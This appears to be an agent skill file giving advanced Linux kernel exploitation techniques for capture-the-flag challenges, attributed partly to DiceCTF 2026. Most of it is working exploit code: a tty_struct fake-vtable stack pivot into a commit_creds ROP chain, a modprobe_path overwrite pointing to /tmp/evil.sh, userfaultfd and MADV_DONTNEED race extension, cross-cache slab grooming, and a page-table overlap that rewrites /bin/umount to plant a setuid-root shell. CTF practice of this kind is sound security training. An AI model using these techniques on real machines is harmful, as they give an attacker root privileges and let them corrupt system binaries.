---
name: pwn-kernel-techniques
description: "CTF kernel exploitation advanced techniques. tty_struct RIP hijack via fake vtable with leave gadget stack pivot, AAW via ioctl register control for modprobe_path overwrite, userfaultfd race stabilization with page split across boundary, SLUB freelist pointer hardening (middle offset kernel 5.7+), freelist XOR obfuscation bypass, kernel panic info leak via KASLR-disabled RIP jump, race window extension via MADV_DONTNEED and mprotect page fault forcing (DiceCTF 2026), cross-cache attack via CPU-split strategy (CPU0 alloc CPU1 free), PTE overlap primitive for arbitrary file write. Triggers: 'tty_struct exploit', 'kernel vtable hijack', 'userfaultfd race', 'slub freelist', 'cross-cache attack', 'pte overlap', 'kernel race condition', 'ioctl krop', 'kernel arbitrary write', 'slab cross-cache'."
---

# CTF Pwn: Advanced Kernel Techniques

tty_struct, userfaultfd, SLUB internals, PTE overlap. DiceCTF 2026 patterns.

---

## Phase 1: tty_struct RIP Hijack

```c
// Pattern: write overflow into tty_struct (size 0x2B8)
// Must preserve magic = 0x5401 at offset +0x00

struct tty_struct_layout {
    // +0x00: magic = 0x5401 (preserve!)
    // +0x08: dev → set to addr of 'pop rsp; ret' gadget
    // +0x10: driver → &tty_struct + 0x170 (ROP chain start)
    // +0x18: ops → &tty_struct + 0x50 (fake vtable ptr)
    // +0x50 to +0x170: fake vtable (ioctl slot → 'leave; ret' gadget)
    // +0x170 to end: actual ROP chain
};

// Execution: ioctl(ptmx_fd, cmd, arg)
// → tty_ioctl() → paranoia check (0x5401 ✓)
// → ops->ioctl() → leave gadget
// → RSP = RBP = &tty_struct → RET to dev field ('pop rsp')
// → RSP = driver field (&tty_struct+0x170) → ROP chain

void build_tty_payload(uint64_t *tty, uint64_t tty_base,
                        uint64_t leave_ret, uint64_t pop_rsp_ret) {
    tty[0] = 0x0100005401;  // magic
    tty[1] = pop_rsp_ret;   // dev
    tty[2] = tty_base + 0x170;  // driver (ROP chain addr)
    tty[3] = tty_base + 0x50;   // ops (fake vtable)
    // vtable ioctl slot (offset 12 * 8 = 0x60 from vtable start):
    tty[10 + 12] = leave_ret;   // vtable.ioctl → leave
    // ROP chain at +0x170:
    int off = 0x170 / 8;
    tty[off++] = pop_rdi_ret;
    tty[off++] = 0;              // prepare_kernel_cred(NULL)
    tty[off++] = prepare_kernel_cred;
    // ... commit_creds + kpti trampoline
}

// Alternative: direct stack pivot via arg register (RDX):
// ioctl(ptmx_fd, cmd, (uint64_t)rop_chain)
// Gadget: push rdx; ...; pop rsp; ...; ret
// Effect: RSP = rop_chain (3rd ioctl arg, fully controlled)
ioctl(ptmx_fd, 0, (unsigned long)rop_chain);
```

---

## Phase 2: AAW via tty_struct ioctl Register Control

```c
// cmd (32-bit) → partial control of EBX, ECX, ESI
// arg (64-bit) → full control of RDX, R8, R12

// Write gadget in fake vtable: "mov DWORD PTR [rdx], esi; ret"
// ESI = lower 32 bits of cmd = lower 32 bits of write value
// RDX = arg = address to write

// Overwrite modprobe_path byte-by-byte (4 bytes at a time):
char target[] = "/tmp/evil.sh\0\0\0\0";
for (int i = 0; i < 16; i += 4) {
    uint32_t val = *(uint32_t*)(target + i);
    ioctl(ptmx_fd, val, modprobe_path + i);
}
// Then: write /tmp/evil.sh (chmod +x), execute unknown binary to trigger
```

---

## Phase 3: userfaultfd Race Stabilization

```c
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>

static int uffd;
static char src_page[4096];

void *uffd_handler(void *arg) {
    struct uffd_msg msg;
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };

    while (poll(&pfd, 1, -1) > 0) {
        read(uffd, &msg, sizeof(msg));
        // *** RACE WINDOW: kernel thread paused here ***
        // Perform race actions: free target, heap spray, etc.
        exploit_race_action();

        // Resume kernel thread:
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFFUL,
            .src = (uint64_t)src_page,
            .len = 4096, .mode = 0
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
    return NULL;
}

void setup_uffd(void *addr, size_t len) {
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    struct uffdio_api api = { .api = UFFD_API, .features = 0 };
    ioctl(uffd, UFFDIO_API, &api);

    struct uffdio_register reg = {
        .range = { .start = (uint64_t)addr, .len = len },
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);

    pthread_t t;
    pthread_create(&t, NULL, uffd_handler, NULL);
}

// Split vulnerable object across page boundary:
// mmap(NULL, 2*PAGE, PROT_RW, MAP_PRIVATE|MAP_ANON, -1, 0)
// Register second page with uffd
// Pass pointer such that object spans boundary
// Kernel reads first half → continues → FAULTS on second half → pauses
```

### When uffd is Disabled

```c
// 1. Large copy_from_user buffer:
// Allocate enormous buf, copy triggers many cache misses → slower
char *huge_buf = mmap(NULL, 64*1024*1024, PROT_RW, ...);

// 2. Repeated attempts:
for (int attempt = 0; attempt < 10000; attempt++) {
    trigger_race_thread1();
    trigger_race_thread2();
    if (check_success()) break;
    reset_state();
}

// 3. MADV_DONTNEED + mprotect (DiceCTF 2026):
// See Phase 6 below
```

---

## Phase 4: SLUB Freelist Hardening

```c
// Since kernel 5.7: free pointer stored at MIDDLE of object (not offset 0)
// s->offset = ALIGN(freepointer_area / 2, sizeof(void*))

// With CONFIG_SLAB_FREELIST_HARDEN enabled:
// stored_ptr = real_ptr XOR kmem_cache->random

// Find random via GDB:
// (gdb) p $gs_base  → cpu-local storage
// follow cpu_slab pointer to kmem_cache_cpu
// p/x (*kmem_cache)->random

// Partial overwrite bypass:
// Overwrite only the lower bytes of stored free pointer
// Combined with KASLR partial leak → reconstruct full ptr

// Detection in GDB:
// x/4gx <freed_object>
// If values look garbled → obfuscation active
// If values look like kernel addresses → no obfuscation
```

---

## Phase 5: Kernel Panic Info Leak

```c
// Pattern: no KASLR (or known layout), initramfs, RIP control
// Flag is loaded into kernel memory as part of initramfs

// Step 1: Find flag VA in kernel memory
// (via /proc/kallsyms or debugfs or kernel oops from wrong jump)

// Step 2: Jump RIP to flag address
unsigned long flag_addr = 0xffffffff83000000;  // example
// Send flag_addr as return address in ROP chain

// Kernel panics: "invalid opcode" on flag bytes
// Panic message includes CODE: near <addr>: XX XX XX XX ...
// Those bytes ARE the flag

// In QEMU: see panic output in terminal
// In CTF netcat: read panic message from output
```

---

## Phase 6: Race Window Extension via MADV_DONTNEED (DiceCTF 2026)

```c
// Pattern: TOCTOU between CHECK and DELETE, but window too narrow
// Fix: force repeated page faults during hash computation

static volatile int racing = 1;

void *page_fault_extender(void *buf) {
    while (racing) {
        // Drop page table entries:
        madvise(buf, 4096, MADV_DONTNEED);
        // Toggle permissions to force fault on next access:
        mprotect(buf, 4096, PROT_READ);
        mprotect(buf, 4096, PROT_READ | PROT_WRITE);
    }
    return NULL;
}

void exploit_extended_race(int fd, void *shared_buf) {
    pthread_t ext_thread;
    pthread_create(&ext_thread, NULL, page_fault_extender, shared_buf);

    // Thread 1: trigger long-running kernel operation (CHECK ioctl)
    // This reads shared_buf via copy_from_user → gets faulted repeatedly
    pthread_create(&t1, NULL, check_thread, fd);

    // Thread 2: when check is paused, trigger concurrent delete
    usleep(100);  // small delay, then:
    pthread_create(&t2, NULL, delete_thread, fd);

    racing = 0;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
}
// Key: MADV_DONTNEED drops PTEs without releasing pages
// Each drop forces VMA lock acquisition + page fault handling → extends window
```

---

## Phase 7: Cross-Cache Attack via CPU Split (DiceCTF 2026)

```c
#define _GNU_SOURCE
#include <sched.h>

void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

void cross_cache_free_pages(int fd, int *fds, int n) {
    // Allocate on CPU 0:
    pin_to_cpu(0);
    for (int i = 0; i < n; i++)
        ioctl(fd, ALLOC_CMD, &fds[i]);  // fills CPU0 partial list

    // Free from CPU 1 → objects go to CPU1 partial list:
    pin_to_cpu(1);
    for (int i = 0; i < n; i++)
        ioctl(fd, FREE_CMD, &fds[i]);
    // CPU1 partial list overflows → node partial list
    // Completely empty slabs → PCP list → buddy allocator

    // Now reclaim as a different object type:
    // Spray with page tables, msg_msg, pipe_buffer, etc.
    pin_to_cpu(0);  // restore
}
```

---

## Phase 8: PTE Overlap Primitive for File Write (DiceCTF 2026)

```c
// After freeing slab page to buddy allocator:
// Reclaim it as a PTE (page table entry) page

// 1. Allocate anonymous mapping: kernel uses freed page as PTE storage
char *anon = mmap(NULL, 512 * 4096, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// Touch all pages to force PTE creation using our freed page:
for (int i = 0; i < 512; i++) anon[i * 4096] = 'A';

// 2. Map read-only file into overlapping virtual range:
int target_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, 4096, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, target_fd, 0);

// 3. PTE page now has entries for BOTH anonymous and file pages
// Write through anonymous mapping → modifies file's physical pages:
memcpy(anon + overlap_offset, "#!/tmp/exploit\n", 15);

// 4. Execute corrupted binary to trigger setuid escalation:
char exploit_sh[] = "#!/bin/sh\nchown root:root /tmp/sh; chmod 4777 /tmp/sh\n";
// Write exploit_sh to /tmp/exploit, chmod +x
system("/bin/umount /tmp 2>/dev/null");  // triggers our file
system("/tmp/sh -p -c 'cat /flag'");
```

---

## Output

Save to `.omop/engagement/ctf/pwn/kernel/`:
- `exploit.c`: compiled exploit
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-kernel-bypass` for KASLR/KPTI/SMEP bypass
→ `ctf-pwn-heap-advanced` for userland heap exploitation
